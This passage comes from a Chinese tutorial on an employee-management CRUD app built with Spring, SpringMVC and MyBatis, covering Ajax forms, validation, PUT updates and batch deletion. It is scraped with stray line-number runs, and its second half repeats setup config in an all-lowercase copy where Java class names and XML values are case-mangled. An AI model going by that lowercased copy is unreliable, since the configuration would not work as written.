navEle.appendTo("#page_nav_area");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n\n\n后台响应json数据，需要引入jackson，并设置@ResponseBody注解\n\n\n# 添加页面显示部门下拉列表\n\n 1. 添加部门Controller\n\n@Controller\npublic class DeptController {\n\n    @Autowired\n    private DeptSerrvice deptSerrvice;\n\n    @ResponseBody\n    @RequestMapping("/depts")\n    public Msg getAllDepts(){\n        List<Department> depts  = deptSerrvice.getAllDepts();\n        return Msg.success().add("depts",depts);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. 当用户点击编辑按钮时，发送Ajax请求，获取到部门信息\n\n//查出所有的部门信息并显示在下拉列表中\nfunction getDepts(ele){\n    //清空之前下拉列表的值\n    $(ele).empty();\n    $.ajax({\n        url:"${APP_PATH}/depts",\n        type:"GET",\n        success:function(result){\n            //{"code":100,"msg":"处理成功！",\n            //"extend":{"depts":[{"deptId":1,"deptName":"开发部"},{"deptId":2,"deptName":"测试部"}]}}\n            //console.log(result);\n            //显示部门信息在下拉列表中\n            //$("#empAddModal select").append("")\n            $.each(result.extend.depts,function(){\n                var optionEle = $("<option></option>").append(this.deptName).attr("value",this.deptId);\n                optionEle.appendTo(ele);\n            });\n        }\n    });\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 检测用户名是否可用\n\n 1. 编写对应的请求处理方法\n\n@GetMapping("/checkuser")\n@ResponseBody\npublic Msg checkUser(@RequestParam("empName")String empName){\n    boolean result = employeeService.checkUserName(empName);\n    if (result){\n        return Msg.success();\n    }else {\n        return Msg.fail().add("va_msg","用户名不可用！");\n    }\n}\n\npublic boolean checkUserName(String empName) {\n    EmployeeExample employeeExample = new EmployeeExample();\n    EmployeeExample.Criteria criteria = employeeExample.createCriteria();\n    criteria.andEmpNameEqualTo(empName);\n    long empsCount = employeeMapper.countByExample(employeeExample);\n    if (empsCount == 0){\n        return true;\n    }else{\n        return false;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. 前端发起Ajax请求\n\n//校验用户名是否可用\n$("#empName_add_input").change(function(){\n    //发送ajax请求校验用户名是否可用\n    var empName = this.value;\n    $.ajax({\n        url:"${APP_PATH}/checkuser",\n        data:"empName="+empName,\n        type:"GET",\n        success:function(result){\n            if(result.code==100){\n                show_validate_msg("#empName_add_input","success","用户名可用");\n                $("#emp_save_btn").attr("ajax-va","success");\n            }else{\n                show_validate_msg("#empName_add_input","error",result.extend.va_msg);\n                $("#emp_save_btn").attr("ajax-va","error");\n            }\n        }\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 保存用户信息\n\n 1. 编写处理接受保存数据的方法\n    \n    /**\n         * 员工保存\n         * 1、支持JSR303校验\n         * 2、导入Hibernate-Validator\n         *\n         *\n         * @return\n         */\n    @RequestMapping(value="/emp",method=RequestMethod.POST)\n    @ResponseBody\n    public Msg saveEmp(@Valid Employee employee, BindingResult result){\n        if(result.hasErrors()){\n            //校验失败，应该返回失败，在模态框中显示校验失败的错误信息\n            Map<String, Object> map = new HashMap<>();\n            List<FieldError> errors = result.getFieldErrors();\n            for (FieldError fieldError : errors) {\n                System.out.println("错误的字段名："+fieldError.getField());\n                System.out.println("错误信息："+fieldError.getDefaultMessage());\n                map.put(fieldError.getField(), fieldError.getDefaultMessage());\n            }\n            return Msg.fail().add("errorFields", map);\n        }else{\n            employeeService.addUser(employee);\n            return Msg.success();\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    \n\n 2. 设置后端JSR303校验\n    \n    package com.pwddd.ssm.bean;\n    \n    import javax.validation.constraints.Pattern;\n    \n    \n    \n    public class Employee {\n        private Integer empId;\n    \n        @Pattern(regexp="(^[a-zA-Z0-9_-]{6,16}$)|(^[\\u2E80-\\u9FFF]{2,5})"\n                 ,message="用户名必须是2-5位中文或者6-16位英文和数字的组合")\n        private String empName;\n    \n        private String gender;\n    \n        //@Email\n        @Pattern(regexp="^([a-z0-9_\\\\.-]+)@([\\\\da-z\\\\.-]+)\\\\.([a-z\\\\.]{2,6})$",\n                 message="邮箱格式不正确")\n        private String email;\n    \n        private Integer dId;\n    \n        //希望查询员工的同时部门信息也是查询好的\n        private Department department;\n    \n    \n        public Employee(String empName, String gender, String email, Integer dId) {\n            this.empName = empName;\n            this.gender = gender;\n            this.email = email;\n            this.dId = dId;\n        }\n    \n        @Override\n        public String toString() {\n            return "Employee [empId=" + empId + ", empName=" + empName\n                + ", gender=" + gender + ", email=" + email + ", dId=" + dId\n                + "]";\n        }\n    \n        public Employee() {\n            super();\n        }\n    \n        public Employee(Integer empId, String empName, String gender, String email,\n                        Integer dId) {\n            super();\n            this.empId = empId;\n            this.empName = empName;\n            this.gender = gender;\n            this.email = email;\n            this.dId = dId;\n        }\n    \n        public Department getDepartment() {\n            return department;\n        }\n    \n        public void setDepartment(Department department) {\n            this.department = department;\n        }\n    \n        public Integer getEmpId() {\n            return empId;\n        }\n    \n        public void setEmpId(Integer empId) {\n            this.empId = empId;\n        }\n    \n        public String getEmpName() {\n            return empName;\n        }\n    \n        public void setEmpName(String empName) {\n            this.empName = empName == null ? null : empName.trim();\n        }\n    \n        public String getGender() {\n            return gender;\n        }\n    \n        public void setGender(String gender) {\n            this.gender = gender == null ? null : gender.trim();\n        }\n    \n        public String getEmail() {\n            return email;\n        }\n    \n        public void setEmail(String email) {\n            this.email = email == null ? null : email.trim();\n        }\n    \n        public Integer getdId() {\n            return dId;\n        }\n    \n        public void setdId(Integer dId) {\n            this.dId = dId;\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    87\n    88\n    89\n    90\n    91\n    92\n    93\n    94\n    95\n    96\n    97\n    98\n    99\n    100\n    101\n    102\n    103\n    \n\n 3. 前端Ajax将表单信息发送给服务器\n    \n    //点击保存，保存员工。\n    $("#emp_save_btn").click(function(){\n        //1、模态框中填写的表单数据提交给服务器进行保存\n        //1、先对要提交给服务器的数据进行校验\n        if(!validate_add_form()){\n            return false;\n        };\n        //1、判断之前的ajax用户名校验是否成功。如果成功。\n        if($(this).attr("ajax-va")=="error"){\n            return false;\n        }\n    \n        //2、发送ajax请求保存员工\n        $.ajax({\n            url:"${APP_PATH}/emp",\n            type:"POST",\n            data:$("#empAddModal form").serialize(),\n            success:function(result){\n                //alert(result.msg);\n                if(result.code == 100){\n                    //员工保存成功；\n                    //1、关闭模态框\n                    $("#empAddModal").modal(\'hide\');\n    \n                    //2、来到最后一页，显示刚才保存的数据\n                    //发送ajax请求显示最后一页数据即可\n                    to_page(totalRecord);\n                }else{\n                    //显示失败信息\n                    //console.log(result);\n                    //有哪个字段的错误信息就显示哪个字段的；\n                    if(undefined != result.extend.errorFields.email){\n                        //显示邮箱错误信息\n                        show_validate_msg("#email_add_input", "error", result.extend.errorFields.email);\n                    }\n                    if(undefined != result.extend.errorFields.empName){\n                        //显示员工名字的错误信息\n                        show_validate_msg("#empName_add_input", "error", result.extend.errorFields.empName);\n                    }\n                }\n            }\n        });\n    });\n    \n    //校验表单数据\n    function validate_add_form(){\n        //1、拿到要校验的数据，使用正则表达式\n        var empName = $("#empName_add_input").val();\n        var regName = /(^[a-zA-Z0-9_-]{6,16}$)|(^[\\u2E80-\\u9FFF]{2,5})/;\n        if(!regName.test(empName)){\n            //alert("用户名可以是2-5位中文或者6-16位英文和数字的组合");\n            show_validate_msg("#empName_add_input", "error", "用户名可以是2-5位中文或者6-16位英文和数字的组合");\n            return false;\n        }else{\n            show_validate_msg("#empName_add_input", "success", "");\n        };\n    \n        //2、校验邮箱信息\n        var email = $("#email_add_input").val();\n        var regEmail = /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/;\n        if(!regEmail.test(email)){\n            //alert("邮箱格式不正确");\n            //应该清空这个元素之前的样式\n            show_validate_msg("#email_add_input", "error", "邮箱格式不正确");\n            /* $("#email_add_input").parent().addClass("has-error");\n                $("#email_add_input").next("span").text("邮箱格式不正确"); */\n            return false;\n        }else{\n            show_validate_msg("#email_add_input", "success", "");\n        }\n        return true;\n    }\n    \n    //显示校验结果的提示信息\n    function show_validate_msg(ele,status,msg){\n        //清除当前元素的校验状态\n        $(ele).parent().removeClass("has-success has-error");\n        $(ele).next("span").text("");\n        if("success"==status){\n            $(ele).parent().addClass("has-success");\n            $(ele).next("span").text(msg);\n        }else if("error" == status){\n            $(ele).parent().addClass("has-error");\n            $(ele).next("span").text(msg);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    \n\n 4. 添加用户后需要跳转到最后一页，显示添加的数据。在分页时需要确保分页的插件显示的信息在合理的范围之内，需要对分页插件进行属性的配置。配置分页合理化参数。\n    \n    <plugins>\n        <plugin interceptor="com.github.pagehelper.PageInterceptor" >\n            <property name="reasonable" value="true"/>\n        </plugin>\n    </plugins>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# 更新员工信息\n\n 1. 前端发起Ajax请求\n    \n    //点击更新，更新员工信息\n    $("#emp_update_btn").click(function(){\n        //验证邮箱是否合法\n        //1、校验邮箱信息\n        var email = $("#email_update_input").val();\n        var regEmail = /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/;\n        if(!regEmail.test(email)){\n            show_validate_msg("#email_update_input", "error", "邮箱格式不正确");\n            return false;\n        }else{\n            show_validate_msg("#email_update_input", "success", "");\n        }\n    \n        //2、发送ajax请求保存更新的员工数据\n        $.ajax({\n            url:"${APP_PATH}/emp/"+$(this).attr("edit-id"),\n            type:"PUT",\n            data:$("#empUpdateModal form").serialize(),\n            success:function(result){\n                //alert(result.msg);\n                //1、关闭对话框\n                $("#empUpdateModal").modal("hide");\n                //2、回到本页面\n                to_page(currentPage);\n            }\n        });\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    \n\n 2. 需要设置一个过滤器，用于将ajax请求中的数据封装到bean中\n    \n    \n    <filter>\n        <filter-name>httpPutFormContentFilter</filter-name>\n        <filter-class>org.springframework.web.filter.HttpPutFormContentFilter</filter-class>\n    </filter>\n    \n    <filter-mapping>\n        <filter-name>httpPutFormContentFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 3. 后台编写处理请求的相关方法\n    \n    /**\n         * 如果直接发送ajax=PUT形式的请求\n         * 封装的数据\n         * Employee\n         * [empId=1014, empName=null, gender=null, email=null, dId=null]\n         *\n         * 问题：\n         * 请求体中有数据；\n         * 但是Employee对象封装不上；\n         * update tbl_emp  where emp_id = 1014;\n         *\n         * 原因：\n         * Tomcat：\n         * \t\t1、将请求体中的数据，封装一个map。\n         * \t\t2、request.getParameter("empName")就会从这个map中取值。\n         * \t\t3、SpringMVC封装POJO对象的时候。\n         * \t\t\t\t会把POJO中每个属性的值，request.getParamter("email");\n         * AJAX发送PUT请求引发的血案：\n         * \t\tPUT请求，请求体中的数据，request.getParameter("empName")拿不到\n         * \t\tTomcat一看是PUT不会封装请求体中的数据为map，只有POST形式的请求才封装请求体为map\n         * org.apache.catalina.connector.Request--parseParameters() (3111);\n         *\n         * protected String parseBodyMethods = "POST";\n         * if( !getConnector().isParseBodyMethod(getMethod()) ) {\n         success = true;\n         return;\n         }\n         *\n         *\n         * 解决方案；\n         * 我们要能支持直接发送PUT之类的请求还要封装请求体中的数据\n         * 1、配置上HttpPutFormContentFilter；\n         * 2、他的作用；将请求体中的数据解析包装成一个map。\n         * 3、request被重新包装，request.getParameter()被重写，就会从自己封装的map中取数据\n         * 员工更新方法\n         * @param employee\n         * @return\n         */\n    @ResponseBody\n    @RequestMapping(value="/emp/{empId}",method=RequestMethod.PUT)\n    public Msg saveEmp(Employee employee, HttpServletRequest request){\n        System.out.println("请求体中的值："+request.getParameter("gender"));\n        System.out.println("将要更新的员工数据："+employee);\n        employeeService.updateEmp(employee);\n        return Msg.success()\t;\n    }\n    \n    /**\n    \t * 员工更新\n    \t * @param employee\n    \t */\n    public void updateEmp(Employee employee) {\n        // TODO Auto-generated method stub\n        employeeMapper.updateByPrimaryKeySelective(employee);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    \n\n\n# 删除员工信息\n\n 1. Ajax发起删除员工请求\n    \n    //单个删除\n    $(document).on("click",".delete_btn",function(){\n        //1、弹出是否确认删除对话框\n        var empName = $(this).parents("tr").find("td:eq(2)").text();\n        var empId = $(this).attr("del-id");\n        //alert($(this).parents("tr").find("td:eq(1)").text());\n        if(confirm("确认删除【"+empName+"】吗？")){\n            //确认，发送ajax请求删除即可\n            $.ajax({\n                url:"${APP_PATH}/emp/"+empId,\n                type:"DELETE",\n                success:function(result){\n                    alert(result.msg);\n                    //回到本页\n                    to_page(currentPage);\n                }\n            });\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    \n\n 2. 后端编写方法处理请求\n    \n    /**\n    \t * 单个批量二合一\n    \t * 批量删除：1-2-3\n    \t * 单个删除：1\n    \t * \n    \t * @param id\n    \t * @return\n    \t */\n    @ResponseBody\n    @RequestMapping(value="/emp/{ids}",method=RequestMethod.DELETE)\n    public Msg deleteEmp(@PathVariable("ids")String ids){\n        //批量删除\n        if(ids.contains("-")){\n            List<Integer> del_ids = new ArrayList<>();\n            String[] str_ids = ids.split("-");\n            //组装id的集合\n            for (String string : str_ids) {\n                del_ids.add(Integer.parseInt(string));\n            }\n            employeeService.deleteBatch(del_ids);\n        }else{\n            Integer id = Integer.parseInt(ids);\n            employeeService.deleteEmp(id);\n        }\n        return Msg.success();\n    }\n    \n    /**\n         * 员工删除\n         * @param id\n         */\n    public void deleteEmp(Integer id) {\n        // TODO Auto-generated method stub\n        employeeMapper.deleteByPrimaryKey(id);\n    }\n    \n    public void deleteBatch(List<Integer> ids) {\n        // TODO Auto-generated method stub\n        EmployeeExample example = new EmployeeExample();\n        EmployeeExample.Criteria criteria = example.createCriteria();\n        //delete from xxx where emp_id in(1,2,3)\n        criteria.andEmpIdIn(ids);\n        employeeMapper.deleteByExample(example);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    \n\n 3. 设置批量删除员工Ajax请求\n    \n    //完成全选/全不选功能\n    $("#check_all").click(function(){\n        //attr获取checked是undefined;\n        //我们这些dom原生的属性；attr获取自定义属性的值；\n        //prop修改和读取dom原生属性的值\n        $(".check_item").prop("checked",$(this).prop("checked"));\n    });\n    \n    //check_item\n    $(document).on("click",".check_item",function(){\n        //判断当前选择中的元素是否5个\n        var flag = $(".check_item:checked").length==$(".check_item").length;\n        $("#check_all").prop("checked",flag);\n    });\n    \n    //点击全部删除，就批量删除\n    $("#emp_delete_all_btn").click(function(){\n        //\n        var empNames = "";\n        var del_idstr = "";\n        $.each($(".check_item:checked"),function(){\n            //this\n            empNames += $(this).parents("tr").find("td:eq(2)").text()+",";\n            //组装员工id字符串\n            del_idstr += $(this).parents("tr").find("td:eq(1)").text()+"-";\n        });\n        //去除empNames多余的,\n        empNames = empNames.substring(0, empNames.length-1);\n        //去除删除的id多余的-\n        del_idstr = del_idstr.substring(0, del_idstr.length-1);\n        if(confirm("确认删除【"+empNames+"】吗？")){\n            //发送ajax请求删除\n            $.ajax({\n                url:"${APP_PATH}/emp/"+del_idstr,\n                type:"DELETE",\n                success:function(result){\n                    alert(result.msg);\n                    //回到当前页面\n                    to_page(currentPage);\n                }\n            });\n        }\n    });\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    \n\n\n# 总结\n\n',normalizedContent:'# ssm\n\n\n# 环境搭建\n\n\n# 引入依赖\n\n引入maven相关依赖\n\n<dependencies>\n    <dependency>\n        <groupid>junit</groupid>\n        <artifactid>junit</artifactid>\n        <version>4.11</version>\n        <scope>test</scope>\n    </dependency>\n\n    \x3c!--引入项目依赖的jar包 --\x3e\n    \x3c!-- springmvc、spring --\x3e\n\n    \x3c!--引入pagehelper分页插件 --\x3e\n    <dependency>\n        <groupid>com.github.pagehelper</groupid>\n        <artifactid>pagehelper</artifactid>\n        <version>5.0.0</version>\n    </dependency>\n\n    \x3c!-- mbg --\x3e\n    <dependency>\n        <groupid>org.mybatis.generator</groupid>\n        <artifactid>mybatis-generator-core</artifactid>\n        <version>1.3.5</version>\n    </dependency>\n\n\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-webmvc</artifactid>\n        <version>4.3.7.release</version>\n    </dependency>\n\n    \x3c!-- 返回json字符串的支持 --\x3e\n    <dependency>\n        <groupid>com.fasterxml.jackson.core</groupid>\n        <artifactid>jackson-databind</artifactid>\n        <version>2.8.8</version>\n    </dependency>\n\n    \x3c!--jsr303数据校验支持；tomcat7及以上的服务器，\n    tomcat7以下的服务器：el表达式。额外给服务器的lib包中替换新的标准的el\n    --\x3e\n    <dependency>\n        <groupid>org.hibernate</groupid>\n        <artifactid>hibernate-validator</artifactid>\n        <version>5.4.1.final</version>\n    </dependency>\n\n\n    \x3c!-- spring-jdbc --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-jdbc</artifactid>\n        <version>4.3.7.release</version>\n    </dependency>\n\n    \x3c!--spring-test --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-test</artifactid>\n        <version>4.3.7.release</version>\n    </dependency>\n\n\n    \x3c!-- spring面向切面编程 --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-aspects</artifactid>\n        <version>4.3.7.release</version>\n    </dependency>\n\n    \x3c!--mybatis --\x3e\n    <dependency>\n        <groupid>org.mybatis</groupid>\n        <artifactid>mybatis</artifactid>\n        <version>3.4.2</version>\n    </dependency>\n\n    \x3c!-- mybatis整合spring的适配包 --\x3e\n    <dependency>\n        <groupid>org.mybatis</groupid>\n        <artifactid>mybatis-spring</artifactid>\n        <version>1.3.1</version>\n    </dependency>\n\n    \x3c!-- 数据库连接池、驱动 --\x3e\n    <dependency>\n        <groupid>c3p0</groupid>\n        <artifactid>c3p0</artifactid>\n        <version>0.9.1</version>\n    </dependency>\n\n    <dependency>\n        <groupid>mysql</groupid>\n        <artifactid>mysql-connector-java</artifactid>\n        <version>5.1.41</version>\n    </dependency>\n\n    \x3c!-- （jstl，servlet-api，junit） --\x3e\n    <dependency>\n        <groupid>jstl</groupid>\n        <artifactid>jstl</artifactid>\n        <version>1.2</version>\n    </dependency>\n\n    <dependency>\n        <groupid>javax.servlet</groupid>\n        <artifactid>javax.servlet-api</artifactid>\n        <version>3.0.1</version>\n        <scope>provided</scope>\n    </dependency>\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n\n\n\n# 引入前端资源\n\n<script type="text/javascript"\n\tsrc="${app_path }/static/js/jquery-1.12.4.min.js"><\/script>\n<link\n\thref="${app_path }/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"\n\trel="stylesheet">\n<script\n\tsrc="${app_path }/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"><\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 配置web.xml\n\n<!doctype web-app public\n "-//sun microsystems, inc.//dtd web application 2.3//en"\n "http://java.sun.com/dtd/web-app_2_3.dtd" >\n\n<web-app>\n    \x3c!-- spring配置文件 加载 --\x3e\n    <context-param>\n        <param-name>contextconfiglocation</param-name>\n        <param-value>classpath:applicationcontext.xml</param-value>\n    </context-param>\n\n    \x3c!-- 编码拦截器 --\x3e\n    <filter>\n        <filter-name>encodingfilter</filter-name>\n        <filter-class>org.springframework.web.filter.characterencodingfilter</filter-class>\n        <init-param>\n            <param-name>encoding</param-name>\n            <param-value>utf-8</param-value>\n        </init-param>\n        <init-param>\n            <param-name>forcerequestencoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n        <init-param>\n            <param-name>forceresponseencoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n    </filter>\n\n    \x3c!-- rest风格拦截器 --\x3e\n    <filter>\n        <filter-name>hiddenhttpmethodfilter</filter-name>\n        <filter-class>org.springframework.web.filter.hiddenhttpmethodfilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>encodingfilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    <filter-mapping>\n        <filter-name>hiddenhttpmethodfilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    \x3c!-- 加载ioc容器 --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.contextloaderlistener</listener-class>\n    </listener>\n\n    \x3c!-- 配置mvc拦截器 --\x3e\n    <servlet>\n        <servlet-name>dispatcherservlet</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            <param-value>classpath:spring-mvc.xml</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>dispatcherservlet</servlet-name>\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\n配置springmvc配置文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:mvc="http://www.springframework.org/schema/mvc"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd">\n\n    \x3c!-- 不适用默认拦截器，配置只拦截controller包 --\x3e\n    <context:component-scan base-package="com.pwddd.ssm" use-default-filters="false">\n        <context:include-filter type="annotation" expression="org.springframework.stereotype.controller"/>\n    </context:component-scan>\n\n    <bean class="org.springframework.web.servlet.view.internalresourceviewresolver" id="viewresolver">\n        <property name="prefix" value="/web-inf/views/" />\n        <property name="suffix" value=".jsp" />\n    </bean>\n\n    \x3c!--  spirngmvc处理不了的 交给tomcat   --\x3e\n    <mvc:default-servlet-handler default-servlet-name="default"/>\n    <mvc:annotation-driven />\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n配置数据库连接信息\n\njdbc.driver=com.mysql.jdbc.driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_crud\njdbc.username=root\njdbc.password=123456\n\n\n1\n2\n3\n4\n\n\n配置spring配置文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd">\n\n    <context:component-scan base-package="com.pwddd.ssm">\n        <context:exclude-filter type="annotation" expression="org.springframework.stereotype.controller"/>\n    </context:component-scan>\n\n    <context:property-placeholder location="classpath:jdbc.properties" />\n    <bean class="com.mchange.v2.c3p0.combopooleddatasource" id="datasource">\n        <property name="driverclass" value="${jdbc.driver}" />\n        <property name="jdbcurl" value="${jdbc.url}" />\n        <property name="user" value="${jdbc.username}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n\n    <bean class="org.springframework.jdbc.datasource.datasourcetransactionmanager" id="datasourcetransactionmanager">\n        <property name="datasource" ref="datasource" />\n    </bean>\n\n    \x3c!--  mybatis整合  --\x3e\n    <bean class="org.mybatis.spring.sqlsessionfactorybean" id="sqlsessionfactory" >\n        <property name="datasource" ref="datasource" />\n        <property name="configlocation" value="classpath:mybatis-config.xml" />\n        <property name="mapperlocations" value="classpath:mapper/*.xml" />\n    </bean>\n\n    <bean class="org.mybatis.spring.mapper.mapperscannerconfigurer" >\n        <property name="basepackage" value="com.pwddd.ssm.dao" />\n    </bean>\n\n    \x3c!--  事务相关的配置  --\x3e\n    <aop:config>\n        <aop:pointcut id="txpoint" expression="execution(* com.pwddd.service..*(..))" />\n        <aop:advisor advice-ref="txadvice" pointcut-ref="txpoint" />\n    </aop:config>\n\n    <tx:advice id="txadvice" transaction-manager="datasourcetransactionmanager">\n        <tx:attributes>\n            <tx:method name="*"/>\n            <tx:method name="get*" read-only="true" />\n        </tx:attributes>\n    